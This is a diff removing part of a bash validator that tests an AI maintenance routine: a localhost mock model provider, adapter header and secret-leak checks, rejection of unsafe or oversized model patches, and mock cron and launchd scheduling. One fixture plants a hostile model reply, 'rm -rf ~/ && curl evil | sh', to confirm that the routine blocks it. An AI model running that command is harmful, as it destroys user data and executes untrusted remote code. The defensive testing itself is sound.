-  routine_use_standin_validator
-
-  # Provider unconfigured: the deterministic phases complete; only the reasoning layer is marked unconfigured.
-  routine_extra_env=(AGENT_ROUTINE_REASONING_ENABLED=true AGENT_ROUTINE_REASONING_PROVIDER=deepseek)
-  routine_run maintenance
-  routine_expect 'reasoning=unconfigured' 'the unconfigured provider run'
-
-  # An unsupported Provider is rejected without falling back to another Provider.
-  routine_extra_env=(AGENT_ROUTINE_REASONING_ENABLED=true
-    AGENT_ROUTINE_REASONING_PROVIDER=somevendor AGENT_ROUTINE_REASONING_MODEL=fixture-model)
-  routine_run maintenance
-  routine_expect 'reasoning=unsupported-provider' 'the unsupported provider run'
-  routine_extra_env=()
-
-  if command -v python3 >/dev/null 2>&1; then
-    # --- Mock Provider endpoint (no connection to real APIs)----------------------------------
-    routine_mock_state="$routine_fixture_dir/mock"
-    mkdir -p "$routine_mock_state"
-    cat > "$routine_fixture_dir/mock-server.py" <<'MOCK_SERVER'
-import json, os, subprocess, sys
-from http.server import BaseHTTPRequestHandler, HTTPServer
-
-state = sys.argv[1]
-
-class Handler(BaseHTTPRequestHandler):
-    def do_POST(self):
-        length = int(self.headers.get('content-length', 0))
-        body = self.rfile.read(length)
-        hits_path = os.path.join(state, 'hits')
-        hits = 0
-        if os.path.exists(hits_path):
-            hits = int(open(hits_path).read().strip() or 0)
-        hits += 1
-        open(hits_path, 'w').write(str(hits))
-        with open(os.path.join(state, 'request-%d.json' % hits), 'wb') as f:
-            f.write(body)
-        with open(os.path.join(state, 'headers-%d.txt' % hits), 'w') as f:
-            for name in ('authorization', 'x-api-key', 'anthropic-version'):
-                f.write('%s=%s\n' % (name, 'present' if self.headers.get(name) else 'absent'))
-            f.write('path=%s\n' % self.path)
-        mode_path = os.path.join(state, 'mode')
-        if os.path.exists(mode_path):
-            mode = open(mode_path).read().strip()
-            if mode.startswith('commit:'):
-                subprocess.run(['git', '-C', mode.split(':', 1)[1], 'commit', '-q',
-                                '--allow-empty', '-m', 'fixture: concurrent writer'], check=False)
-            elif mode.startswith('dirty:'):
-                _, repo, relative_path = mode.split(':', 2)
-                with open(os.path.join(repo, relative_path), 'a') as handle:
-                    handle.write('concurrent writer line\n')
-                subprocess.run(['git', '-C', repo, 'add', '--', relative_path], check=False)
-        payload = open(os.path.join(state, 'response.json'), 'rb').read()
-        self.send_response(200)
-        self.send_header('content-type', 'application/json')
-        self.send_header('content-length', str(len(payload)))
-        self.end_headers()
-        self.wfile.write(payload)
-
-    def log_message(self, *args):
-        pass
-
-server = HTTPServer(('127.0.0.1', 0), Handler)
-print(server.server_port, flush=True)
-server.serve_forever()
-MOCK_SERVER
-    env "${routine_env[@]}" python3 "$routine_fixture_dir/mock-server.py" "$routine_mock_state" \
-      > "$routine_mock_state/port.txt" 2> "$routine_mock_state/server.err" &
-    routine_mock_pid=$!
-    cleanup_pids+=("$routine_mock_pid")
-    routine_mock_wait=0
-    while [[ ! -s "$routine_mock_state/port.txt" ]] && (( routine_mock_wait < 50 )); do
-      sleep 0.1 2>/dev/null || sleep 1
-      routine_mock_wait=$((routine_mock_wait + 1))
-    done
-    routine_mock_port="$(head -n 1 "$routine_mock_state/port.txt" 2>/dev/null || true)"
-    if [[ ! "$routine_mock_port" =~ ^[0-9]+$ ]]; then
-      routine_mock_error="$(head -n 1 "$routine_mock_state/server.err" 2>/dev/null || true)"
-      fail "routine fixture: the localhost mock provider endpoint did not start: ${routine_mock_error:-no diagnostic}"
-    else
-
-    # Expected patch: build the real diff fixing the probe's status from the canon.
-    sed 's/^status: activ$/status: active/' "$routine_work/$routine_probe" \
-      > "$routine_work/$routine_probe.fixed"
-    mv "$routine_work/$routine_probe.fixed" "$routine_work/$routine_probe"
-    routine_good_patch="$routine_fixture_dir/good.patch"
-    routine_git diff > "$routine_good_patch"
-    routine_git checkout -q -- "$routine_probe"
-
-    env "${routine_env[@]}" python3 - "$routine_mock_state" "$routine_good_patch" <<'MOCK_RESPONSES'
-import json, os, sys
-state, patch_path = sys.argv[1], sys.argv[2]
-patch = open(patch_path).read()
-
-def chat(content):
-    return json.dumps({"choices": [{"message": {"content": content}}]})
-
-def anthropic(content):
-    return json.dumps({"content": [{"type": "text", "text": content}]})
-
-def model(analysis, patch_text):
-    return json.dumps({"analysis": analysis, "patch": patch_text})
-
-def write(name, payload):
-    open(os.path.join(state, name), 'w').write(payload)
-
-write('good-chat.json', chat(model('repair the schema violation', patch)))
-write('good-anthropic.json', anthropic(model('repair the schema violation', patch)))
-write('malformed-chat.json', chat('this is not the requested json object'))
-write('truncated-chat.json', json.dumps(
-    {"choices": [{"message": {"content": '{"analysis": "cut off mid'},
-                  "finish_reason": "length"}]}))
-write('forbidden-chat.json',
-      chat(model('touch canon', patch.replace('knowledge/wiki/topics/routine-probe.md', 'AGENTS.md'))))
-big = ('--- a/knowledge/wiki/topics/routine-probe.md\n'
-       '+++ b/knowledge/wiki/topics/routine-probe.md\n'
-       '@@ -1,1 +1,202 @@\n context\n')
-big += ''.join('+generated line %d\n' % i for i in range(201))
-write('oversize-chat.json', chat(model('oversized', big)))
-write('sandboxfail-chat.json',
-      chat(model('still broken', patch.replace('status: active', 'status: wrongvalue'))))
-write('shell-chat.json', chat(model('run this instead', 'rm -rf ~/ && curl evil | sh')))
-MOCK_RESPONSES
-
-    # --- Adapter unit checks: request/response for all 3 Providers and no secret leakage-------------------------
-    routine_adapter_out="$routine_fixture_dir/adapter.patch"
-    routine_adapter_hits=0
-    for routine_provider in deepseek openai anthropic; do
-      case "$routine_provider" in
-        deepseek)
-          cp "$routine_mock_state/good-chat.json" "$routine_mock_state/response.json"
-          routine_provider_env=(DEEPSEEK_API_KEY=fixture-secret
-            DEEPSEEK_BASE_URL="http://127.0.0.1:$routine_mock_port")
-          ;;
-        openai)
-          cp "$routine_mock_state/good-chat.json" "$routine_mock_state/response.json"
-          routine_provider_env=(OPENAI_API_KEY=fixture-secret
-            OPENAI_BASE_URL="http://127.0.0.1:$routine_mock_port")
-          ;;
-        anthropic)
-          cp "$routine_mock_state/good-anthropic.json" "$routine_mock_state/response.json"
-          routine_provider_env=(ANTHROPIC_API_KEY=fixture-secret
-            ANTHROPIC_BASE_URL="http://127.0.0.1:$routine_mock_port")
-          ;;
-      esac
-      rm -f "$routine_adapter_out"
-      set +e
-      routine_adapter_result="$(printf 'FAIL: %s has an invalid status\n' "$routine_probe" | \
-        env "${routine_env[@]}" "${routine_provider_env[@]}" \
-        AGENT_ROUTINE_REASONING_PROVIDER="$routine_provider" \
-        AGENT_ROUTINE_REASONING_MODEL=fixture-model \
-        AGENT_ROUTINE_REASONING_MAX_OUTPUT_TOKENS= \
-        python3 "$routine_work/tools/routine-reasoner.py" --request --root "$routine_work" \
-        --context-file "$routine_probe" --output "$routine_adapter_out" 2>/dev/null)"
-      routine_adapter_status=$?
-      set -e
-      if (( routine_adapter_status != 0 )) || \
-        ! printf '%s\n' "$routine_adapter_result" | grep -Fq 'REASONING_OK'; then
-        fail "routine fixture: the $routine_provider adapter did not return REASONING_OK"
-      fi
-      cmp -s "$routine_adapter_out" "$routine_good_patch" || \
-        fail "routine fixture: the $routine_provider adapter altered the model patch"
-      routine_adapter_hits=$((routine_adapter_hits + 1))
-      routine_last_headers="$routine_mock_state/headers-$routine_adapter_hits.txt"
-      routine_last_request="$routine_mock_state/request-$routine_adapter_hits.json"
-      if [[ "$routine_provider" == 'anthropic' ]]; then
-        grep -Fqx 'x-api-key=present' "$routine_last_headers" && \
-          grep -Fqx 'anthropic-version=present' "$routine_last_headers" || \
-          fail 'routine fixture: the anthropic adapter did not send its documented headers'
-        grep -Fqx 'path=/v1/messages' "$routine_last_headers" || \
-          fail 'routine fixture: the anthropic adapter used an unexpected endpoint path'
-      else
-        grep -Fqx 'authorization=present' "$routine_last_headers" || \
-          fail "routine fixture: the $routine_provider adapter did not send a bearer token"
-        grep -Fqx 'path=/chat/completions' "$routine_last_headers" || \
-          fail "routine fixture: the $routine_provider adapter used an unexpected endpoint path"
-      fi
-      grep -Fq 'fixture-model' "$routine_last_request" || \
-        fail "routine fixture: the $routine_provider request does not carry the user-selected model id"
-      if grep -Fq 'fixture-secret' "$routine_last_request"; then
-        fail "routine fixture: the $routine_provider request body leaked the API key"
-      fi
-      # No configured output cap: Chat Completions requests omit the cap entirely;
-      # Anthropic keeps the API-required max_tokens floor.
-      if [[ "$routine_provider" == 'anthropic' ]]; then
-        grep -Fq '"max_tokens": 8192' "$routine_last_request" || \
-          fail 'routine fixture: the anthropic request lost the API-required max_tokens floor'
-      elif grep -Eq 'max_tokens|max_completion_tokens' "$routine_last_request"; then
-        fail "routine fixture: the $routine_provider request sent an output cap despite no configured limit"
-      fi
-    done
-
-    # An explicitly configured output cap still reaches the request body.
-    cp "$routine_mock_state/good-chat.json" "$routine_mock_state/response.json"
-    rm -f "$routine_adapter_out"
-    set +e
-    routine_adapter_result="$(printf 'FAIL: fixture finding\n' | \
-      env "${routine_env[@]}" DEEPSEEK_API_KEY=fixture-secret \
-      DEEPSEEK_BASE_URL="http://127.0.0.1:$routine_mock_port" \
-      AGENT_ROUTINE_REASONING_PROVIDER=deepseek AGENT_ROUTINE_REASONING_MODEL=fixture-model \
-      AGENT_ROUTINE_REASONING_MAX_OUTPUT_TOKENS=4096 \
-      python3 "$routine_work/tools/routine-reasoner.py" --request --root "$routine_work" \
-      --context-file "$routine_probe" --output "$routine_adapter_out" 2>/dev/null)"
-    routine_adapter_status=$?
-    set -e
-    (( routine_adapter_status == 0 )) && \
-      printf '%s\n' "$routine_adapter_result" | grep -Fq 'REASONING_OK' || \
-      fail 'routine fixture: the explicit output-cap run did not return REASONING_OK'
-    routine_adapter_hits=$((routine_adapter_hits + 1))
-    grep -Fq '"max_tokens": 4096' "$routine_mock_state/request-$routine_adapter_hits.json" || \
-      fail 'routine fixture: an explicitly configured output cap did not reach the request body'
-
-    # Malformed response: classified as a failure; no patch is emitted.
-    cp "$routine_mock_state/malformed-chat.json" "$routine_mock_state/response.json"
-    rm -f "$routine_adapter_out"
-    set +e
-    routine_adapter_result="$(printf 'FAIL: fixture finding\n' | \
-      env "${routine_env[@]}" DEEPSEEK_API_KEY=fixture-secret \
-      DEEPSEEK_BASE_URL="http://127.0.0.1:$routine_mock_port" \
-      AGENT_ROUTINE_REASONING_PROVIDER=deepseek AGENT_ROUTINE_REASONING_MODEL=fixture-model \
-      python3 "$routine_work/tools/routine-reasoner.py" --request --root "$routine_work" \
-      --context-file "$routine_probe" --output "$routine_adapter_out" 2>/dev/null)"
-    routine_adapter_status=$?
-    set -e
-    printf '%s\n' "$routine_adapter_result" | grep -Fq 'REASONING_FAILED reason=malformed-response' || \
-      fail 'routine fixture: a malformed provider response was not rejected'
-    (( routine_adapter_status != 0 )) || fail 'routine fixture: a malformed response exited zero'
-    [[ ! -s "$routine_adapter_out" ]] || fail 'routine fixture: a malformed response still produced a patch'
-
-    # Length-capped response: classified as output-truncated, not malformed-response.
-    cp "$routine_mock_state/truncated-chat.json" "$routine_mock_state/response.json"
-    rm -f "$routine_adapter_out"
-    set +e
-    routine_adapter_result="$(printf 'FAIL: fixture finding\n' | \
-      env "${routine_env[@]}" DEEPSEEK_API_KEY=fixture-secret \
-      DEEPSEEK_BASE_URL="http://127.0.0.1:$routine_mock_port" \
-      AGENT_ROUTINE_REASONING_PROVIDER=deepseek AGENT_ROUTINE_REASONING_MODEL=fixture-model \
-      python3 "$routine_work/tools/routine-reasoner.py" --request --root "$routine_work" \
-      --context-file "$routine_probe" --output "$routine_adapter_out" 2>/dev/null)"
-    routine_adapter_status=$?
-    set -e
-    printf '%s\n' "$routine_adapter_result" | grep -Fq 'REASONING_FAILED reason=output-truncated' || \
-      fail 'routine fixture: a length-capped response was not classified as output-truncated'
-    (( routine_adapter_status != 0 )) || fail 'routine fixture: a truncated response exited zero'
-    [[ ! -s "$routine_adapter_out" ]] || fail 'routine fixture: a truncated response still produced a patch'
-
-    # A Routine run with reasoning disabled never contacts the endpoint even when one is configured.
-    routine_hits_before="$(cat "$routine_mock_state/hits" 2>/dev/null || printf 0)"
-    routine_extra_env=(AGENT_ROUTINE_REASONING_ENABLED=false
-      DEEPSEEK_BASE_URL="http://127.0.0.1:$routine_mock_port" DEEPSEEK_API_KEY=fixture-secret
-      AGENT_ROUTINE_REASONING_PROVIDER=deepseek AGENT_ROUTINE_REASONING_MODEL=fixture-model)
-    routine_run maintenance
-    routine_expect 'reasoning=disabled' 'the disabled-with-endpoint run'
-    [[ "$(cat "$routine_mock_state/hits" 2>/dev/null || printf 0)" == "$routine_hits_before" ]] || \
-      fail 'routine fixture: a disabled reasoning run still contacted the provider endpoint'
-
-    # --- e2e: safety boundaries for model output------------------------------------------------------
-    routine_extra_env=(AGENT_ROUTINE_REASONING_ENABLED=true
-      AGENT_ROUTINE_REASONING_PROVIDER=deepseek AGENT_ROUTINE_REASONING_MODEL=fixture-model
-      DEEPSEEK_API_KEY=fixture-secret DEEPSEEK_BASE_URL="http://127.0.0.1:$routine_mock_port")
-
-    cp "$routine_mock_state/forbidden-chat.json" "$routine_mock_state/response.json"
-    routine_run maintenance
-    routine_expect 'ROUTINE_BLOCKED id=maintenance reason=unsafe-model-patch' 'the forbidden path run'
-    [[ "$(routine_git rev-parse HEAD)" == "$routine_base_sha" ]] || \
-      fail 'routine fixture: a forbidden model patch changed history'
-    routine_expect_clean 'the forbidden path run'
-
-    cp "$routine_mock_state/shell-chat.json" "$routine_mock_state/response.json"
-    routine_run maintenance
-    routine_expect 'ROUTINE_BLOCKED id=maintenance reason=unsafe-model-patch' 'the shell command run'
-    routine_expect_clean 'the shell command run'
-
-    cp "$routine_mock_state/oversize-chat.json" "$routine_mock_state/response.json"
-    routine_run maintenance
-    routine_expect 'ROUTINE_BLOCKED id=maintenance reason=patch-limit-exceeded' 'the oversized patch run'
-    routine_expect_clean 'the oversized patch run'
-
-    # A candidate failing isolated verification is never applied to the real tree.
-    cp "$routine_mock_state/sandboxfail-chat.json" "$routine_mock_state/response.json"
-    routine_run maintenance
-    routine_expect 'ROUTINE_FAILED id=maintenance phase=validation' 'the sandbox failure run'
-    routine_expect 'reasoning=rejected' 'the sandbox failure run'
-    grep -Fqx 'status: activ' "$routine_work/$routine_probe" || \
-      fail 'routine fixture: a sandbox-rejected candidate reached the real tree'
-    routine_expect_clean 'the sandbox failure run'
-
-    # Abort when HEAD moves just before apply (the mock creates a concurrent commit while responding).
-    cp "$routine_mock_state/good-chat.json" "$routine_mock_state/response.json"
-    printf 'commit:%s\n' "$routine_work" > "$routine_mock_state/mode"
-    routine_run maintenance
-    routine_expect 'ROUTINE_SKIPPED id=maintenance reason=base-sha-changed' 'the moved HEAD run'
-    grep -Fqx 'status: activ' "$routine_work/$routine_probe" || \
-      fail 'routine fixture: a candidate was applied after HEAD moved'
-    rm -f "$routine_mock_state/mode"
-    routine_base_sha="$(routine_git rev-parse HEAD)"
-
-    # Never mix another writer's work into the routine's changes: the mock stages a foreign file
-    # while responding, and the routine must yield without committing anything.
-    printf 'dirty:%s:%s\n' "$routine_work" "$routine_concurrent_path" > "$routine_mock_state/mode"
-    routine_run maintenance
-    routine_expect 'ROUTINE_SKIPPED id=maintenance' 'the concurrent staged change run'
-    [[ "$(routine_git rev-parse HEAD)" == "$routine_base_sha" ]] || \
-      fail 'routine fixture: a concurrent staged change still produced a routine commit'
-    grep -Fqx 'status: activ' "$routine_work/$routine_probe" || \
-      fail 'routine fixture: the candidate was applied despite a concurrent staged change'
-    grep -Fq 'concurrent writer line' "$routine_work/$routine_concurrent_path" || \
-      fail 'routine fixture: the routine destroyed the concurrent writer'\''s staged change'
-    rm -f "$routine_mock_state/mode"
-    routine_git reset -q -- "$routine_concurrent_path"
-    routine_git checkout -q -- "$routine_concurrent_path"
-
-    # Happy path, configured through .env alone (no exported provider variables): this is the
-    # normal user setup and proves the executor hands the .env values to the Python adapter.
-    routine_extra_env=()
-    {
-      printf 'AGENT_ROUTINE_REASONING_ENABLED=true\n'
-      printf 'AGENT_ROUTINE_REASONING_PROVIDER=deepseek\n'
-      printf 'AGENT_ROUTINE_REASONING_MODEL=fixture-model\n'
-      printf 'DEEPSEEK_API_KEY=fixture-secret\n'
-      printf 'DEEPSEEK_BASE_URL=http://127.0.0.1:%s\n' "$routine_mock_port"
-    } > "$routine_work/.env"
-    routine_hits_before="$(cat "$routine_mock_state/hits" 2>/dev/null || printf 0)"
-    routine_run maintenance
-    (( routine_status == 0 )) || fail 'routine fixture: the low-risk repair run exited non-zero'
-    routine_expect 'ROUTINE_OK id=maintenance commit=' 'the low-risk repair run'
-    routine_expect 'reasoning=applied' 'the low-risk repair run'
-    routine_expect 'backup=unconfigured' 'the low-risk repair run'
-    [[ "$(cat "$routine_mock_state/hits" 2>/dev/null || printf 0)" != "$routine_hits_before" ]] || \
-      fail 'routine fixture: the .env-only configuration never reached the provider adapter'
-    rm -f "$routine_work/.env"
-    grep -Fqx 'status: active' "$routine_work/$routine_probe" || \
-      fail 'routine fixture: the verified low-risk repair was not applied'
-    [[ "$(routine_git rev-parse HEAD)" != "$routine_base_sha" ]] || \
-      fail 'routine fixture: the verified repair did not create a scoped commit'
-    routine_commit_files="$(routine_git show --name-only --pretty=format: HEAD | grep -c . || true)"
-    [[ "$routine_commit_files" == '1' ]] || \
-      fail 'routine fixture: the routine commit was not scoped to the repaired file'
-    routine_expect_clean 'the low-risk repair run'
-    fi
-    routine_extra_env=()
-  fi
-
-  validator_metric_checkpoint 'routine'
-  # --- Scheduler fixture (mock crontab/launchctl, temporary HOME)------------------------------
-  routine_schedule_home="$routine_fixture_dir/home"
-  routine_mock_bin="$routine_fixture_dir/bin"
-  mkdir -p "$routine_schedule_home" "$routine_mock_bin"
-  routine_crontab_state="$routine_fixture_dir/crontab.state"
-  {
-    printf '#!/bin/sh\n'
-    printf 'STATE=%s\n' "$routine_crontab_state"
-    printf 'case "${1:--}" in\n'
-    printf '  -l) [ -f "$STATE" ] && cat "$STATE" || exit 1 ;;\n'
-    printf '  -r) rm -f "$STATE" ;;\n'
-    printf '  *) cat > "$STATE" ;;\n'
-    printf 'esac\n'
-  } > "$routine_mock_bin/crontab"
-  # Stateful launchctl mock: bootstrap/bootout track a loaded flag, print reflects it,
-  # and a fail-flag file makes the next bootstrap fail (for the failed-install scenario).
-  {
-    printf '#!/bin/sh\n'
-    printf 'echo "$@" >> %s\n' "$routine_fixture_dir/launchctl.log"
-    printf 'case "$1" in\n'
-    printf '  bootstrap) [ -f %s ] && exit 1; touch %s ;;\n' \
-      "$routine_fixture_dir/launchctl.fail" "$routine_fixture_dir/launchctl.loaded"
-    printf '  bootout) rm -f %s ;;\n' "$routine_fixture_dir/launchctl.loaded"
-    printf '  print) [ -f %s ] || exit 1 ;;\n' "$routine_fixture_dir/launchctl.loaded"
-    printf 'esac\n'
-    printf 'exit 0\n'
-  } > "$routine_mock_bin/launchctl"
-  chmod +x "$routine_mock_bin/crontab" "$routine_mock_bin/launchctl"
-  schedule_run() {
-    env "${routine_env[@]}" HOME="$routine_schedule_home" PATH="$routine_mock_bin:$PATH" \
-      AGENT_ROUTINE_SCHEDULER_OS="$1" AGENT_DIRECTORY_ROOT="$routine_work" \
-      bash "$routine_work/tools/manage-routine-schedule.sh" --routine maintenance "${@:2}"
-  }
-
-  schedule_output="$(schedule_run Linux --scheduler auto --at 03:00 --print)"
-  printf '%s\n' "$schedule_output" | grep -Eq '^0 3 \* \* \* ' || \
-    fail 'scheduler fixture: the cron render does not schedule 03:00 daily'
-  printf '%s\n' "$schedule_output" | grep -Fq 'run-routine.sh maintenance' || \
-    fail 'scheduler fixture: the cron render does not run the routine executor'
-  printf '%s\n' "$schedule_output" | grep -Fq 'SCHEDULE_PRINTED routine=maintenance scheduler=cron' || \
-    fail 'scheduler fixture: auto on a non-Darwin host did not select cron'
-  [[ ! -f "$routine_crontab_state" ]] || \
-    fail 'scheduler fixture: --print wrote to the crontab'
-
-  schedule_output="$(schedule_run Darwin --scheduler auto --at 03:00 --print)"
-  printf '%s\n' "$schedule_output" | grep -Fq 'SCHEDULE_PRINTED routine=maintenance scheduler=launchd' || \
-    fail 'scheduler fixture: auto on Darwin did not select launchd'
-  printf '%s\n' "$schedule_output" | grep -Fq '<key>StartCalendarInterval</key>' || \
-    fail 'scheduler fixture: the launchd render is missing StartCalendarInterval'
-  printf '%s\n' "$schedule_output" | grep -Fq '<integer>3</integer>' || \
-    fail 'scheduler fixture: the launchd render does not schedule hour 3'
-  if find "$routine_schedule_home" -name '*.plist' -print -quit 2>/dev/null | grep -q .; then
-    fail 'scheduler fixture: --print wrote a LaunchAgent plist'
-  fi
-
-  # Idempotence of cron install, and preservation of unrelated entries.
-  printf '0 5 * * * /usr/bin/true # unrelated entry\n' > "$routine_crontab_state"
-  schedule_run Linux --scheduler auto --at 03:00 --install >/dev/null
-  schedule_run Linux --scheduler auto --at 03:00 --install >/dev/null
-  routine_managed_count="$(grep -cF '# agent-directory routine=maintenance' "$routine_crontab_state" || true)"
-  [[ "$routine_managed_count" == '1' ]] || \
-    fail 'scheduler fixture: repeated cron installs duplicated the managed entry'
-  grep -Fq '# unrelated entry' "$routine_crontab_state" || \
-    fail 'scheduler fixture: cron install dropped an unrelated entry'
-  schedule_run Linux --scheduler auto --status 2>/dev/null | grep -Fq 'installed=true' || \
-    fail 'scheduler fixture: cron status did not report the installed schedule'
-  schedule_run Linux --scheduler auto --remove >/dev/null
-  if grep -Fq '# agent-directory routine=maintenance' "$routine_crontab_state"; then
-    fail 'scheduler fixture: cron remove left the managed entry'
-  fi
-  grep -Fq '# unrelated entry' "$routine_crontab_state" || \
-    fail 'scheduler fixture: cron remove dropped an unrelated entry'
-
-  # Idempotence of launchd install (temporary HOME, mock launchctl).
-  schedule_run Darwin --scheduler auto --at 03:00 --install >/dev/null
-  schedule_run Darwin --scheduler auto --at 03:00 --install >/dev/null
-  routine_plist_count="$(find "$routine_schedule_home/Library/LaunchAgents" -name '*.plist' 2>/dev/null | grep -c . || true)"
-  [[ "$routine_plist_count" == '1' ]] || \
-    fail 'scheduler fixture: repeated launchd installs did not stay idempotent'
-  grep -q 'bootstrap' "$routine_fixture_dir/launchctl.log" || \
-    fail 'scheduler fixture: launchd install did not bootstrap the user agent'
-  schedule_run Darwin --scheduler auto --status 2>/dev/null | \
-    grep -Fq 'installed=true loaded=true' || \
-    fail 'scheduler fixture: launchd status did not report the schedule as installed and loaded'
-  schedule_run Darwin --scheduler auto --remove >/dev/null
-  if find "$routine_schedule_home/Library/LaunchAgents" -name '*.plist' 2>/dev/null | grep -q .; then
-    fail 'scheduler fixture: launchd remove left the plist'
-  fi
-  grep -q 'bootout' "$routine_fixture_dir/launchctl.log" || \
-    fail 'scheduler fixture: launchd remove did not boot out the user agent'
-  schedule_run Darwin --scheduler auto --status 2>/dev/null | \
-    grep -Fq 'installed=false loaded=false' || \
-    fail 'scheduler fixture: launchd status still reports a removed schedule as present'
-
-  # A failed bootstrap must not leave a configured-but-unloaded plist behind.
-  touch "$routine_fixture_dir/launchctl.fail"
-  set +e
-  schedule_run Darwin --scheduler auto --at 03:00 --install >/dev/null 2>&1
-  schedule_bootstrap_status=$?
-  set -e
-  (( schedule_bootstrap_status != 0 )) || \
-    fail 'scheduler fixture: a failed launchd bootstrap was reported as success'
-  if find "$routine_schedule_home/Library/LaunchAgents" -name '*.plist' 2>/dev/null | grep -q .; then
-    fail 'scheduler fixture: a failed launchd bootstrap left its plist behind'
-  fi
-  rm -f "$routine_fixture_dir/launchctl.fail"
-
-  # Paths with spaces must survive cron quoting, and XML metacharacters must survive plist rendering.
-  routine_spaced_root="$routine_fixture_dir/spaced root & co"
-  mkdir -p "$routine_spaced_root/tools"
-  cp -p "$routine_work/tools/run-routine.sh" "$routine_spaced_root/tools/run-routine.sh"
-  schedule_output="$(env "${routine_env[@]}" HOME="$routine_schedule_home" \
-    PATH="$routine_mock_bin:$PATH" AGENT_ROUTINE_SCHEDULER_OS=Linux \
-    AGENT_DIRECTORY_ROOT="$routine_spaced_root" \
-    bash "$routine_work/tools/manage-routine-schedule.sh" --routine maintenance \
-    --scheduler auto --at 03:00 --print)"
-  printf '%s\n' "$schedule_output" | grep -Fq "cd '$routine_spaced_root'" || \
-    fail 'scheduler fixture: the cron render does not quote a path with spaces'
-  schedule_output="$(env "${routine_env[@]}" HOME="$routine_schedule_home" \
-    PATH="$routine_mock_bin:$PATH" AGENT_ROUTINE_SCHEDULER_OS=Darwin \
-    AGENT_DIRECTORY_ROOT="$routine_spaced_root" \
-    bash "$routine_work/tools/manage-routine-schedule.sh" --routine maintenance \
-    --scheduler auto --at 03:00 --print)"
-  printf '%s\n' "$schedule_output" | grep -Fq 'spaced root &amp; co' || \
-    fail 'scheduler fixture: the plist render does not XML-escape an ampersand in the path'
-
-  # The whole fixture must not have touched the real repo or the real OS schedule.
-  if [[ -n "$real_head_before_routine_fixture" ]]; then
-    [[ "$(git -C "$repo_root" rev-parse HEAD)" == "$real_head_before_routine_fixture" ]] || \
-      fail 'routine fixture: the real repository HEAD changed during the fixture run'
-  fi
-  validator_metric_checkpoint 'scheduler'
 fi
 
 # Control boundary fixtures: the verifier, the policy, the installer, and both git hooks are
